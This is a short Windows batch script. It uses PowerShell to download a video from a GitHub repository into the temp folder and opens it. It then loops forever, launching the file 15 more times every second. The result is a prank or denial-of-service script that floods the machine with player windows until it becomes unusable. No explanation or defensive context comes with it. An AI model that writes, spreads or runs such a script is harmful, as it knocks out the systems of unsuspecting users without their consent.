@echo off
cls

set "file=Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4"
set "path=%temp%\%file%"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4','%path%')"

if not exist "%path%" (
    echo download failed
    pause
    exit
)

start "" /max "%path%"

timeout /t 10 >nul

:loop

for /l %%i in (1,1,15) do (
    start "" "%path%"
)

timeout /t 1 >nul

goto loop
